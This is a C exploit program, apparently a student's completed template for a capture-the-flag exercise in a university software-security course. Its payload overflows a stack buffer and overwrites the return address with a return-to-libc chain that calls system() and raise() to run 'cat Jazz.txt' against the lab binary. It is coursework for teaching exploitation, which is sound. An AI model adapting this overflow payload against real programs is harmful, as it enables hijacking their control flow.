/*
 * CTF-2 `vcat3' exploit (template)
 *
 * Vasileios P. Kemerlis <vpk@cs.brown.edu>
 *  - CSCI 1650: Software Security and Exploitation
 *  - https://cs.brown.edu/courses/csci1650/
 */

#include <stdlib.h>
#include <unistd.h>

unsigned char payload[] =
	/* ------------------------------------	*/
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXX"
	/* ------------------------------------	*/
	/* BELOW IS THE FIRST RETURN ADDRESS OVERWRITTEN */
	/* ------------------------------------	*/
	"\x40\x90\xE9\xB5"	// System Address
	"\x40\x8D\xE8\xB5"	// Raise Address (return address of System)
	"\x7C\xB6\xFF\xBF"	// Pointer to System's argument (on stack)
	"\x0C\x00\x00\x00"	// Raise's Argument

	"\x20\x20\x20\x20"	// A shitload of whitespace to make it an easier target to hit
	"\x20\x20\x20\x20"
	"\x20\x20\x20\x20"
	"\x20\x20\x20\x20"
	"\x20\x20\x20\x20"
	"\x20\x20\x20\x20"
	"\x20\x20\x20\x20"
	"\x20\x20\x20\x20"
	"\x20\x20\x20\x20"
	"\x20\x20\x20\x20"
	"\x20\x20\x20\x20"
	"\x20\x20\x20\x20"
	"\x20\x20\x20\x20"
	"\x20\x20\x20\x20"
	"\x20\x20\x20\x20"
	"\x20\x20\x20\x20"
	"\x20\x20\x20\x20"
	"\x20\x20\x20\x20"
	"\x20\x20\x20\x20"
	"\x20\x20\x20\x20"
	"\x20\x20\x20\x20"
	"\x20\x20\x20\x20"

	// "cat Jazz.txt\0"
	"\x63\x61\x74\x20"
	"\x4A\x61\x7A\x7A"
	"\x2E\x74\x78\x74"
	"\x00\x00\x00\x00"
;

int
main(int argc, char **argv)
{
	/*
	 * dump the payload in 'stdout'
	 * sizeof(payload)-1:	ignore the trailing '\0';
	 *			(strings are NULL terminated)
	 */
	write(STDOUT_FILENO, payload, sizeof(payload)-1);

	/* done; success		*/
	return EXIT_SUCCESS;
}
